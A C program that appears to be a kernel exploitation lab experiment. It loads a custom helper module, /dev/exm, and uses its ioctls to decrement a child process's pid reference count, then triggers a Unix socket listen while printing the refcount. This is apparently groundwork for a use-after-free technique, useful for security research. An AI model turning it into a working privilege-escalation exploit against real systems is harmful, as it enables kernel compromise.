#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <err.h>
#include <semaphore.h>
#include <sys/mman.h>

#include "exm.h"

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define pfork() syscall(__NR_clone, CLONE_FS | CLONE_FILES | SIGCHLD, NULL, NULL, NULL, 0)

int exm;
int listensock;
struct {
    sem_t sem;
    sem_t p_sem;
} *data;

void setup() {
    struct sockaddr_un unix_addr = {
        .sun_family = AF_UNIX,
        .sun_path = "/tmp/exploitsocket"
    };
    insmod();
    exm = SYSCHK(open("/dev/exm", O_RDWR));
    listensock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    unlink(unix_addr.sun_path);
    SYSCHK(bind(listensock, (struct sockaddr*)&unix_addr, sizeof(unix_addr)));
    data = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    sem_init(&data->sem, 1, 0);
    sem_init(&data->p_sem, 1, 0);
}

unsigned long pid_addr;

void exm_chk_refcnt()
{
    int refcnt = ioctl(exm, IOC_PID_REFCNT, pid_addr);
    printf("[PID] refcount = 0x%x (%d)\n", refcnt, refcnt);
}

int main() {
    int status;
    setup();
    ioctl(exm, IOC_TRACE_MSG, 1);
    pid_t child = SYSCHK(pfork());
    if (child == 0) {
        child = getpid();

        ioctl(exm, IOC_CRED);
        puts("child");

        puts("wait dec");
        sem_wait(&data->sem);
        ioctl(exm, IOC_DEC_PID);
        puts("post dec");
        sem_post(&data->p_sem);

        puts("wait listen");
        sem_wait(&data->sem);
        SYSCHK(listen(listensock, 512));
        puts("post listen");
        sem_post(&data->p_sem);

        exit(0);
    }
    pid_addr = ioctl(exm, IOC_PID_ADDR, child);
    sem_post(&data->sem); // dec pid
    sem_wait(&data->p_sem);
    exm_chk_refcnt();
    sleep(1);
    exm_chk_refcnt();
    sem_post(&data->sem); // listen
    sem_wait(&data->p_sem);
    if (waitpid(child, &status, 0) != child) {
        err(1, "wait for bug child");
    }

    pause();

    return 0;
}